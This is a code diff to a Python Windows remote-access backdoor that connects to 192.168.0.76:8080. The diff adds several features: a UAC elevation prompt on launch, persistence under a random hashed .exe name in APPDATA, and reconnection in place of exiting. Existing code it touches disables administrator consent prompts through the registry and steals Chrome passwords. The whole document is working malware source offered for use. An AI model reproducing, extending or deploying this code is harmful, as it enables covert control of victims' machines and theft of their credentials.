@@ -14,6 +14,18 @@ from winreg import *
 import task_manager as tm
 from PIL import ImageGrab
 from shutil import copyfile
+import ctypes, sys
+import time
+import hashlib
+
+
+def is_admin():
+    try:
+        return ctypes.windll.Shell32.IsUserAnAdmin()
+    except:
+        return False
+
+
 
 class backdoor:
     try:
@@ -47,7 +59,7 @@ class backdoor:
                 time.sleep(wait_time)
             else:
                 break
-
+    
     def reliable_send(self, data):
         try:
             json_data = json.dumps(data)
@@ -75,7 +87,12 @@ class backdoor:
 
     def add_to_startup(self, on_startup):
         try:
-            app_path = os.path.join(self.APPDATA, os.path.basename(self.PATH))
+            genName = str(time.time())
+            genName = hashlib.md5(genName.encode())
+            genName = genName.hexdigest()
+            genName = genName + ".exe"
+            app_path = os.path.join(self.APPDATA, os.path.basename(genName))
+            
             if not os.getcwd() == self.APPDATA:
                 copyfile(self.PATH, app_path)
 
@@ -94,21 +111,21 @@ class backdoor:
         try:
             REG_VALUE = "ConsentPromptBehaviorAdmin"
             reg_key = OpenKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_ALL_ACCESS)
-            SetValueEx(reg_key, "ConsentPromptBehaviorAdmin", 0, REG_DWORD, 5)
+            SetValueEx(reg_key, REG_VALUE, 0, REG_DWORD, 5)
             CloseKey(reg_key)
             return "[+] Ok: {}.".format()
         except Exception as e:
-            return "[+] Adm Confirmation Disable."
+            return "[+] Adm Confirmation Enable. {}".format(e)
 
     def disable_admin_confirm(self):
         try:
             REG_VALUE = "ConsentPromptBehaviorAdmin"
             reg_key = OpenKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_ALL_ACCESS)
-            SetValueEx(reg_key, "ConsentPromptBehaviorAdmin", 0, REG_DWORD, 0)
+            SetValueEx(reg_key, REG_VALUE, 0, REG_DWORD, 0)
             CloseKey(reg_key)
             return "[+] Ok: {}.".format()
         except Exception as e:
-            return "[+] Adm Confirmation Enable." #temporary fix
+            return "[+] Adm Confirmation Disable. {}".format(e) #temporary fix
             
 
     def remove_from_startup(self):
@@ -185,7 +202,7 @@ class backdoor:
     def get_browser_passwords(self):
         try:
             decrypt_chrome_password.decrypt_pass()
-            return "file output.txt create sucesso.".format(e)
+            return "file output.txt create sucesso.".format()
         except Exception as e:
             return "file output.txt create sucesso.".format(e)
 
@@ -285,7 +302,8 @@ class backdoor:
                 if len(rest_of_command) == 0:       # Commands with no arguments
                     if command_0 == "exit":     # Exit the program
                         self.connection.close()
-                        exit()
+                        my_backdoor = backdoor("192.168.0.76", 8080)
+                        my_backdoor.run()
                     elif command_0 == "user":
                         command_result = self.get_current_user()
                     elif command_0 == "info":       # Get Info about the system
@@ -364,5 +382,10 @@ class backdoor:
 
             self.reliable_send(command_result)
 
-my_backdoor = backdoor("192.168.0.76", 8080)
-my_backdoor.run()
+
+if is_admin():
+    my_backdoor = backdoor("192.168.0.76", 8080)
+    my_backdoor.run()
+else:
+    # Re-run the program with admin rights
+    ctypes.windll.Shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
